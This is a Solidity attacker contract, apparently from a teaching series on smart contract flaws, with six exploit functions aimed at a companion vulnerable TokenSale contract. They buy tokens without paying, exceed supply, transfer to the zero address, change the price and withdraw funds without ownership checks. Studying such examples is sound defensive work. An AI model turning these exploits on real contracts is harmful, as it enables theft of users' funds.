// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Attacker Contract: InputValidationExploiter
// This contract exploits the lack of input validation in the TokenSale contract.

import "./SC04_Input_Validation_Victim.sol";

contract InputValidationExploiter {
    TokenSale public vulnerableContract;

    constructor(address vulnerableContractAddress) {
        vulnerableContract = TokenSale(vulnerableContractAddress);
    }

    // Receive function to accept ETH
    receive() external payable {}

    // Attack 1: Purchase tokens without sending enough ETH
    function attackPurchaseWithoutPayment(uint256 amount) external {
        // Exploit: Call purchaseTokens with an amount but send 0 or insufficient ETH
        vulnerableContract.purchaseTokens{value: 0}(amount);
    }

    // Attack 2: Purchase more tokens than available supply
    function attackExceedSupply(uint256 amount) external payable {
        // Exploit: Purchase amount that exceeds total supply
        vulnerableContract.purchaseTokens{value: msg.value}(amount);
    }

    // Attack 3: Transfer tokens with underflow
    function attackTransferUnderflow(address to, uint256 amount) external {
        // Exploit: Try to transfer more tokens than owned (causes underflow in older Solidity versions)
        // In Solidity 0.8+, this will revert, but the lack of validation is still a vulnerability
        vulnerableContract.transfer(to, amount);
    }

    // Attack 4: Transfer to zero address
    function attackTransferToZero(uint256 amount) external {
        // Exploit: Transfer tokens to zero address (burning them unintentionally)
        vulnerableContract.transfer(address(0), amount);
    }

    // Attack 5: Change token price without being owner
    function attackChangePrice(uint256 newPrice) external {
        // Exploit: Change the token price without being the owner
        vulnerableContract.setTokenPrice(newPrice);
    }

    // Attack 6: Withdraw funds without being owner
    function attackWithdraw() external {
        // Exploit: Withdraw contract funds without being the owner
        vulnerableContract.withdraw();
    }

    // Check attacker's token balance
    function getTokenBalance() external view returns (uint256) {
        return vulnerableContract.balances(address(this));
    }

    // Check attacker's ETH balance
    function getETHBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
